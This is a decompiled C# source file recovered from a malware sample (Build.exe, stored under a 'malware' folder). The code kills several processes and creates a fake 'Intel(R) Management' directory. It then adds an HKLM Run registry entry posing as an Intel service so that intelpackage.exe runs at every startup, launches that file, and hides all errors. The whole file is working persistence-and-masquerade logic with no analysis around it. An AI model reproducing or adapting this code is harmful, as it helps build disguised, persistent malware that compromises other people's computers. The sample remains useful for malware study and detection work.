// Decompiled with JetBrains decompiler
// Type: Program.Module1
// Assembly: Program, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AE112E4D-F167-49FF-A3FB-40F1535BBBA8
// Assembly location: C:\Users\gorno\Desktop\malware\dzorta\Build.exe

using Microsoft.VisualBasic.CompilerServices;
using Program.My;
using System;
using System.Diagnostics;
using System.IO;

namespace Program
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void Main()
    {
      try
      {
        string str1 = "run";
        if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(str1)).Length > 0)
          Process.GetProcessesByName(str1)[0].Kill();
        string str2 = "intelsevice";
        if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(str2)).Length > 0)
          Process.GetProcessesByName(str2)[0].Kill();
        string str3 = "intelmain";
        if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(str3)).Length > 0)
          Process.GetProcessesByName(str3)[0].Kill();
        Directory.CreateDirectory("C:\\ProgramData\\Intel(R) Management");
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "Intel(R) Management Service", (object) "C:\\ProgramData\\Intel(R) Management\\intelpackage.exe");
        Process.Start("C:\\ProgramData\\Intel(R) Management\\intelpackage.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
